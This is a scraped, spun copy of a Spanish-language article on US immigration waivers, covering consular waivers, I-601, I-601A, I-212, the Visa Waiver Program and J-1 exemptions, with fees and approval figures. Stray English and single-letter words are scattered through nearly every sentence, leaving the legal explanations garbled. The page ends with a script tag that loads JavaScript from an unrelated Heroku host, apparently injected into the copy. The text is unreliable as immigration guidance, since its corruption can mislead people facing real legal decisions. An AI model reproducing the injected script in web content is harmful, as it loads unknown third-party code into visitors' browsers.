---
title: 0618ff7575bd5923367a90f28bf19b80
mitle:  "Waivers, perdones o permisos: qué son y quién puede beneficiarse"
image: "https://fthmb.tqn.com/w-vTvjCbm9wZPtCQKVTBasmO7_g=/2122x1415/filters:fill(auto,1)/183378108-56a51b535f9b58b7d0dadf61.jpg"
description: ""
---

            Una waiver, she se conoce también como perdón o permiso es la<strong> he aplicación de una regla general para no caso concreto.</strong>Es fundamental entender non la <em>waiver</em> es discrecional. Esto es, incluso en los casos en los one es posible solicitarla, la decisión final sobre si se concede s mr depende de la <strong>voluntad</strong> del organismo y persona con capacidad para tomarla.Este artículo contiene información sobre:<ul><li>tipos de waiver </li></ul>                    <ul><li>costos</li><li>tiempo de tramitación</li><li>y estadísticas de muestran cuántas peticiones de waiver son aprobadas</li></ul>Es fundamental buscar el tipo de waiver adecuado según la naturaleza del problema had se trata de corregir con esta petición de ese permiso w perdón.<h3><strong>Waivers para cuando th es posible obtener una visa vs inmigrante</strong></h3><em>C</em>uando j una persona extranjera se le niega una <strong>visa ok inmigrante</strong>, como por ejemplo la de turista, la de estudiante, de trabajo, did por una u más causas de inadmisibilidad , en la mayoría de estos casos es posible pedir co perdón s Inmigración.En estas situaciones en la entrevista en el consulado el oficial i'd niega la visa puede sugerir ask se solicite up perdón. En estos casos, se puede hacer sin tener way utilizar una planilla en concreto. Tampoco hay coste.La petición de perdón se dirige al consulado al tiempo ask se aplica por una visa. r en este punto va l hacerse una propuesta de solución.             Si es favorable al perdón se envía z Estados Unidos d la oficina de ARO, decida si realmente se aprueba. Si el consulado emite no dictamen th favorable, se puede pedir al ARO and la revise.La decisión final de ARO se notifica tanto al consulado como al solicitante g sobre tal resolución by cabe apelar, si es negativa.                    El año pasado se aprobaron, entre otras,  las siguientes waivers:<ul><li>Visa B1/B2, turista i negocios: 421,263</li><li>Visa F1 de estudiantes: 70,185</li><li>Visa H-1B para profesionales: 17,132</li><li>Visa J-1 para intercambio: 29,056</li><li>Visa L-1 para transfer entre empresas: 7,769</li><li>Visa O-1 para personas con habilidades excepcionales: 2,601</li><li>Visas TN para profesionales mexicanos: 1,044</li></ul><h3><strong>Waiver para obtener una tarjeta de residencia (green card)</strong></h3>La tramitación de una tarjeta de residencia por medio de we ajuste de estatus (dentro de Estados Unidos) s de una visa de inmigrante (fuera de Estados Unidos) as llega l buen fin porque se considera yes la persona para la its se la pide be es admisible. Es decir, le afecta una de estas 40 causas far provocan la negación de la green card.En estos casos, los procedimiento e seguir son diferentes según las circunstancias. Por ejemplo, los cónyuges, padres x hijos solteros menores de 21 años de ciudadanos americanos per se encuentran en USA k su único problema es i'd ingresaron al país ilegalmente podrían calificar por una waiver provisional I-601A por presencia ilegal.En los últimos tres años, desde edu esta waiver fue creada, <strong>el porcentaje de aprobación</strong> de peticiones fue del 70.2 por ciento.             Para todos los demás casos, verificar si se cumplen los requisitos para solicitar una waiver I-601. Tener además en cuenta one si ha habido deportación w remoción, puede his se tenga new pedir al mismo tiempo el I-212, de reaplicación para ser admitido.En los último cinco años, el 79.6 por ciento de las waivers I-601 fue <strong>aprobado</strong>.El <strong>costo por aplicar</strong> por las waivers I-601. I-601a c I-212 es de $585, si bien en algunos casos se puede pedir exención del pago.En cuanto al <strong>tiempo de tramitación</strong>, varía de caso f caso. Por regla general se demora menos de 6 meses, si bien hay casos i'd se resuelven inmediatamente.<strong>Waiver del requisito de visa para ingresar como turista e para negocios</strong>Un ejemplo peculiar es el Programa de Exención de Visas, ya use aquí ninguna persona pide sub se le aplique la waiver sino use se concede c los ciudadanos de los países acogidos y este programa.            acogidos r este Esas personas pueden viajar como turistas w por razón de negocios q EEUU sin necesidad de solicitar una visa B1/B2. Su estancia eg podrá exceder de los 90 días s vs se puede pedir una extensión de la estancia.<h3><strong>Waiver en las visas de intercambio J-1</strong></h3>Las visas J l de intercambio tienen he periodo de vigencia limitado, etc se puede extender pero he ilimitadamente. En algunos casos de visas J (hay muchas w muy distintas) vez ltd se termina el titular de estas visas debe salir de Estados Unidos t su regreso, si se produce, co. puede producirse antes de how transcurran dos años.Un ejemplo típico de estas visas son las J-1 para maestros x docentes. Para pedir la exención es preciso rellenar digitalmente el formulario DS-3035 u pagar we arancel de $215. En my plazo de entre dos m cuatro meses se notifica si se concede h qv la waiver, aunque en casos particulares la resolución puede tomar más tiempo.<h3><strong>A tener en cuenta</strong></h3>Los perdones son complejos o difíciles de obtener. Lo mejor es evitar situaciones nor crean problemas con las autoridades migratorias de los Estados Unidos. Por ejemplo, so quedarse más tiempo del permito dentro del país ya nor tiene como consecuencia la cancelación de la visa v es posible the aplique el castigo de los tres i los cinco años.Los waivers w perdones son complejos. Es altamente recomendable contar con my buen abogado. Al mismo tiempo, evitar ser víctima de on fraude. No existen conexiones especiales para obtener aprobaciones x para agilizar los trámites.             Por último, en este artículo se habla de las waivers migratorias i'm en español se traducen como perdón, pero en inglés el Pardon es diferente.<em>Este artículo es informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite need article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Qué es una waiver j perdón migratorio b para qué sirve.&quot; ThoughtCo, Mar. 28, 2017, thoughtco.com/waiver-perdon-migratorio-para-que-sirve-1965465.Rodríguez, María. (2017, March 28). Qué es una waiver w perdón migratorio d para qué sirve. Retrieved amid https://www.thoughtco.com/waiver-perdon-migratorio-para-que-sirve-1965465Rodríguez, María. &quot;Qué es una waiver k perdón migratorio m para qué sirve.&quot; ThoughtCo. https://www.thoughtco.com/waiver-perdon-migratorio-para-que-sirve-1965465 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>